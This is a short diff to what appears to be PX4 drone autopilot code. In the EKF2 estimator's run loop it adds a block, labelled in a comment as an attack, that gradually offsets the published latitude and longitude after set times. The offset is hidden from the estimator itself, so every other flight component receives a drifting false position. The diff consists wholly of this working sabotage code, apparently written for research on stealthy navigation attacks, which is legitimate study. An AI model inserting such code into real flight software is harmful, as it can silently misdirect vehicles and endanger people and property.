@@ -1193,6 +1193,16 @@ void Ekf2::run()
 
 					global_pos.dead_reckoning = _ekf.inertial_dead_reckoning(); // True if this position is estimated through dead-reckoning
 
+					//XXX attack: insert offset seen by all components except ekf2*
+					if ((now > double(3e7)) & (now < double(11e7))) {
+					    global_pos.lat = global_pos.lat - double(1e-6*3.597e-5)*(now-double(3e7));//1.799e-6
+					    global_pos.lon = global_pos.lon + double(1e-6*4.384e-5)*(now-double(3e7));//1.799e-6
+					}
+					if (now > double(11e7)) {
+					    global_pos.lat = global_pos.lat - double(1e-6*3.597e-5)*double(8e7)-double(1e-6*2.968e-5)*(now-double(11e7));
+					    global_pos.lon = global_pos.lon + double(1e-6*4.384e-5)*double(8e7)+double(1e-6*5.314e-5)*(now-double(11e7));
+					}
+
 					_vehicle_global_position_pub.update();
 				}
 			}
